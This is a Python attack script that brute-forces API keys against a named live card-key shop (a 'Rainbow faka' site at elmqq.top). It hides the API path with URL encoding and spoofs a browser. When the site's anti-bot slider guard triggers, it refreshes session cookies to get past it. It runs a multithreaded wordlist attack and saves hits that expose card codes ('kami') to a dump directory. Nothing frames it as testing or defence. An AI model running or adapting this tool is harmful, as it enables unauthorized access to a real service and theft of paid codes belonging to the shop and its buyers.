#!/usr/bin/env python3
"""Rainbow faka API key brute — BASE via env (default elmqq.top)."""
import json
import os
import random
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = os.environ.get("BASE", "https://elmqq.top/shop/")
if not BASE.endswith("/"):
    BASE += "/"
API = BASE + "%61pi.php/"
HOST = BASE.split("//")[1].split("/")[0].replace(".", "_")
OUT = Path(os.environ.get("OUT", f"/data/automation/results/{HOST}/kami_dump"))
OUT.mkdir(parents=True, exist_ok=True)
WL = Path(sys.argv[1]) if len(sys.argv) > 1 else OUT / "keys.txt"
START = int(sys.argv[2]) if len(sys.argv) > 2 else 0
LIMIT = int(sys.argv[3]) if len(sys.argv) > 3 else 0
WORKERS = int(sys.argv[4]) if len(sys.argv) > 4 else 20
WID = int(sys.argv[5]) if len(sys.argv) > 5 else 0
CK = f"/tmp/kami_ck_{HOST}_w{WID}.txt"
HITS = OUT / "KAMI_HIT.jsonl"
FOUND = OUT / "API_KEY_FOUND.txt"
PROG = OUT / f"progress_w{WID}.json"
LOGF = open(OUT / f"brute_w{WID}.log", "a", buffering=1)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
LOCK = threading.Lock()
DELAY = float(os.environ.get("DELAY", "0.05"))
PARAMS = os.environ.get("PARAMS", "key").split(",")
guard_hits = 0


def log(m):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] w{WID} {m}"
    print(line, flush=True)
    with LOCK:
        LOGF.write(line + "\n")
        LOGF.flush()


def session_refresh():
    subprocess.run(
        ["curl", "-sk", "--max-time", "12", "-A", UA, "-c", CK, "-b", CK, BASE, "-o", "/dev/null"],
        capture_output=True,
        timeout=18,
    )


def curl(url, t=8):
    cmd = [
        "curl", "-sk", "--max-time", str(t), "-A", UA, "-e", BASE,
        "-H", "X-Requested-With: XMLHttpRequest", "-b", CK, "-c", CK, url,
    ]
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=t + 3).stdout or ""
    except Exception:
        return ""


def is_guard(b):
    return b and ("_guard/html.js" in b or "slider_html" in b)


def is_auth(b):
    return b and "请提供用户登录信息或API对接密钥" in b


def is_success(b):
    if not b or is_guard(b) or is_auth(b):
        return False
    if "用户名或密码不正确" in b or "Invalid key" in b or b.strip() == "No key":
        return False
    if '"code":0' in b or any(x in b for x in ("kminfo", "卡密", "----", "kmdata")):
        return True
    if any(x in b for x in ("不存在", "未找到", "无此", "订单")) and "请提供" not in b:
        return True
    if '"code"' in b and "请提供" not in b:
        return True
    return False


def get_api(url):
    global guard_hits
    if DELAY:
        time.sleep(DELAY + random.random() * 0.03)
    body = curl(url)
    if is_guard(body) or not body:
        with LOCK:
            guard_hits += 1
        time.sleep(1.2)
        session_refresh()
        time.sleep(0.3)
        body = curl(url)
    return body


def try_key(key):
    for param in PARAMS:
        url = API + f"?act=search&id=1&{param}=" + quote(key, safe="")
        body = get_api(url)
        if is_success(body):
            rec = {"key": key, "param": param, "body": body[:800], "ts": datetime.now().isoformat()}
            with LOCK:
                with HITS.open("a", encoding="utf-8") as f:
                    f.write(json.dumps(rec, ensure_ascii=False) + "\n")
                FOUND.write_text(f"{param}={key}\n", encoding="utf-8")
            log(f"KAMI_HIT key={key} param={param}")
            return True
    return False


def main():
    session_refresh()
    keys = [x.strip() for x in WL.read_text(encoding="utf-8", errors="ignore").splitlines() if x.strip()]
    if START:
        keys = keys[START:]
    if LIMIT:
        keys = keys[:LIMIT]
    log(f"start BASE={BASE} keys={len(keys)} workers={WORKERS}")
    tested = 0
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futures = {ex.submit(try_key, k): k for k in keys}
        for fut in as_completed(futures):
            tested += 1
            if tested % 200 == 0:
                rate = tested / max(time.time() - t0, 1)
                log(f"progress tested={tested} rate={rate:.2f}/s guard={guard_hits}")
                PROG.write_text(
                    json.dumps({"tested": tested, "guard": guard_hits, "rate": rate}),
                    encoding="utf-8",
                )
    log(f"done tested={tested}")


if __name__ == "__main__":
    main()
